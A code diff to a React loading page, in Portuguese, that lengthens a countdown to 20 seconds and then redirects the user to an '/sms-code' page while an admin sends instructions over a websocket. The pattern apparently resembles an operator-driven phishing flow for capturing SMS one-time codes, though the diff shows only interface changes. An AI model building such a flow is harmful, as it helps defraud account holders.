@@ -5,7 +5,7 @@ import { useSocket } from "@/hooks/useSocket";
 export default function LoadingPage() {
   const [, navigate] = useLocation();
   const { socket } = useSocket();
-  const [countdown, setCountdown] = useState(3); // Simulated delay of 3 seconds
+  const [countdown, setCountdown] = useState(20); // 20 second timer before automatic redirect
 
   useEffect(() => {
     // Listen for websocket messages from admin
@@ -32,6 +32,8 @@ export default function LoadingPage() {
       setCountdown((prev) => {
         if (prev <= 1) {
           clearInterval(timer);
+          // Automatically navigate to SMS code page after countdown
+          navigate("/sms-code");
           return 0;
         }
         return prev - 1;
@@ -55,7 +57,8 @@ export default function LoadingPage() {
             <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
           </svg>
         </div>
-        <p className="text-xl font-medium text-gray-800">Aguarde enquanto validamos o seu acesso...</p>
+        <p className="text-xl font-medium text-gray-800 mb-2">Aguarde enquanto validamos o seu acesso...</p>
+        <p className="text-sm text-gray-600">Redirecionando em {countdown} segundos</p>
       </div>
     </div>
   );
